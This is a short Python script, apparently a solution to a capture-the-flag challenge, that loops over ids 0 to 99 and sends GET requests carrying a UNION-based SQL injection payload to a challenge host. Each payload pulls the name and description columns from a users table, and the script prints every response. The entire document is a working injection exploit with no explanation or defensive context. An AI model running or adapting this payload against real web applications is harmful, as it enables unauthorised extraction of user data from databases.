import requests
for i in range(100):
    r=requests.get('http://challs.xmas.htsp.ro:11002/?name=%21+%27%27UNION%20SELECT%201,name,description%20from%20users%20where%20id='+str(i)+'--')
    print(r.text)